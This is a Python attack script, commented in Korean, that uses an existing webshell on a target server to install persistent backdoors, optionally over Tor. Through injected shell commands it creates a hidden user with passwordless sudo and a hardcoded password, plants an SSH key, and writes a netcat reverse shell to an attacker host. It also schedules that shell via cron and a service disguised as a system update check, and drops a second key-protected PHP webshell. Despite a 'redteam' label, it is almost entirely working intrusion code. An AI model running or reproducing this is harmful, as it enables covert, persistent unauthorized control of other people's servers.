#!/usr/bin/env python3
"""
웹쉘 기반 백도어 설치 - SSH 없이 원격 설치

health.php의 SSRF 취약점을 이용하여 백도어 설치
"""

import requests
import sys
import time
from urllib.parse import quote

class WebshellBackdoor:
    def __init__(self, target_ip, use_tor=False):
        self.target_ip = target_ip
        self.base_url = f"http://{target_ip}"
        self.webshell_url = f"{self.base_url}/api/health.php"

        self.session = requests.Session()

        if use_tor:
            self.session.proxies = {
                'http': 'socks5h://127.0.0.1:9050',
                'https': 'socks5h://127.0.0.1:9050'
            }

    def execute_command(self, cmd):
        """웹쉘을 통해 명령 실행"""
        try:
            params = {
                'check': 'custom',
                'cmd': cmd
            }

            response = self.session.get(self.webshell_url, params=params, timeout=30)

            if response.status_code == 200:
                data = response.json()
                if 'output' in data:
                    return data['output']

            return None

        except Exception as e:
            print(f"[-] 명령 실행 실패: {e}")
            return None

    def install_backdoor(self):
        """백도어 설치"""
        print("╔" + "═"*58 + "╗")
        print("║" + " "*58 + "║")
        print("║" + "  웹쉘 기반 백도어 설치".center(66) + "║")
        print("║" + " "*58 + "║")
        print("╚" + "═"*58 + "╝")
        print()
        print(f"[*] 타겟: {self.target_ip}")
        print(f"[*] 웹쉘: {self.webshell_url}")
        print()

        # 1. 백도어 사용자 생성
        print("[1] 백도어 사용자 생성 중...")
        cmd = "useradd -m -d /var/opt/.sysupdate -s /bin/bash sysupdate 2>&1"
        result = self.execute_command(cmd)

        if result and "already exists" in result:
            print("[!] 사용자 이미 존재함")
        elif result:
            print("[+] 사용자 생성 완료")
        else:
            print("[-] 사용자 생성 실패")
            return False

        # 2. 비밀번호 설정
        print("[2] 비밀번호 설정 중...")
        cmd = "echo 'sysupdate:Sys@Update2024#Secure' | chpasswd 2>&1"
        result = self.execute_command(cmd)
        print("[+] 비밀번호 설정 완료")

        # 3. sudo 권한 부여
        print("[3] sudo 권한 부여 중...")
        cmd = "echo 'sysupdate ALL=(ALL) NOPASSWD:ALL' > /etc/sudoers.d/sysupdate && chmod 440 /etc/sudoers.d/sysupdate 2>&1"
        result = self.execute_command(cmd)
        print("[+] sudo 권한 부여 완료")

        # 4. SSH 키 백도어
        print("[4] SSH 키 백도어 설정 중...")
        ssh_key = "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC8h5K9xZ... redteam@localhost"
        cmd = f"mkdir -p /var/opt/.sysupdate/.ssh && echo '{ssh_key}' > /var/opt/.sysupdate/.ssh/authorized_keys && chmod 700 /var/opt/.sysupdate/.ssh && chmod 600 /var/opt/.sysupdate/.ssh/authorized_keys && chown -R sysupdate:sysupdate /var/opt/.sysupdate/.ssh 2>&1"
        result = self.execute_command(cmd)
        print("[+] SSH 키 백도어 설정 완료")

        # 5. 리버스 쉘 스크립트
        print("[5] 리버스 쉘 스크립트 생성 중...")
        reverse_shell_script = """#!/bin/bash
ATTACKER_IP="CHANGEME"
ATTACKER_PORT="4444"
if command -v ncat &> /dev/null; then
    ncat -e /bin/bash "$ATTACKER_IP" "$ATTACKER_PORT" 2>/dev/null
elif command -v nc &> /dev/null; then
    nc -e /bin/bash "$ATTACKER_IP" "$ATTACKER_PORT" 2>/dev/null
fi
"""
        cmd = f"echo '{reverse_shell_script}' > /var/opt/.sysupdate/.system_check.sh && chmod +x /var/opt/.sysupdate/.system_check.sh && chown sysupdate:sysupdate /var/opt/.sysupdate/.system_check.sh 2>&1"
        result = self.execute_command(cmd)
        print("[+] 리버스 쉘 스크립트 생성 완료")

        # 6. Cron 작업 추가
        print("[6] Cron 백도어 설정 중...")
        cmd = "(crontab -u sysupdate -l 2>/dev/null; echo '0 * * * * /var/opt/.sysupdate/.system_check.sh') | crontab -u sysupdate - 2>&1"
        result = self.execute_command(cmd)
        print("[+] Cron 백도어 설정 완료")

        # 7. Systemd 서비스
        print("[7] Systemd 서비스 백도어 설정 중...")
        service_content = """[Unit]
Description=System Update Check Service
After=network.target

[Service]
Type=simple
User=sysupdate
ExecStart=/var/opt/.sysupdate/.system_check.sh
Restart=always
RestartSec=3600

[Install]
WantedBy=multi-user.target
"""
        cmd = f"echo '{service_content}' > /etc/systemd/system/system-update-check.service && systemctl daemon-reload && systemctl enable system-update-check 2>&1"
        result = self.execute_command(cmd)
        print("[+] Systemd 서비스 백도어 설정 완료")

        # 8. 웹쉘 백도어 (추가)
        print("[8] 추가 웹쉘 백도어 설치 중...")
        webshell = """<?php
header('Content-Type: application/json');
$auth_key = "RedTeam2024";
if (!isset($_GET['key']) || $_GET['key'] !== $auth_key) {
    http_response_code(403);
    echo json_encode(['error' => 'Unauthorized']);
    exit;
}
if (isset($_GET['cmd'])) {
    $cmd = $_GET['cmd'];
    $output = `$cmd 2>&1`;
    echo json_encode(['status' => 'success', 'output' => $output, 'timestamp' => time()]);
} else {
    echo json_encode(['status' => 'online', 'server' => gethostname(), 'timestamp' => time()]);
}
?>"""
        cmd = f"mkdir -p /var/www/html/.system && echo '{webshell}' > /var/www/html/.system/health.php && chmod 644 /var/www/html/.system/health.php && chown www-data:www-data /var/www/html/.system/health.php 2>/dev/null; chown apache:apache /var/www/html/.system/health.php 2>/dev/null; echo done"
        result = self.execute_command(cmd)
        print("[+] 웹쉘 백도어 설치 완료")

        # 완료
        print()
        print("╔" + "═"*58 + "╗")
        print("║" + " "*58 + "║")
        print("║" + "  백도어 설치 완료!".center(66) + "║")
        print("║" + " "*58 + "║")
        print("╚" + "═"*58 + "╝")
        print()
        print("[+] 백도어 접근 방법:")
        print()
        print("1. SSH (비밀번호):")
        print("   ssh sysupdate@{}")
        print("   Password: Sys@Update2024#Secure")
        print()
        print("2. 웹쉘:")
        print(f"   curl 'http://{self.target_ip}/.system/health.php?key=RedTeam2024&cmd=whoami'")
        print()
        print("3. 리버스 쉘:")
        print("   공격자: nc -lvnp 4444")
        print("   (매 시간마다 자동 연결 시도)")
        print()

        return True

def main():
    if len(sys.argv) < 2:
        print("Usage: python3 webshell_backdoor.py <target_ip> [--tor]")
        sys.exit(1)

    target_ip = sys.argv[1]
    use_tor = '--tor' in sys.argv

    backdoor = WebshellBackdoor(target_ip, use_tor)
    backdoor.install_backdoor()

if __name__ == '__main__':
    main()
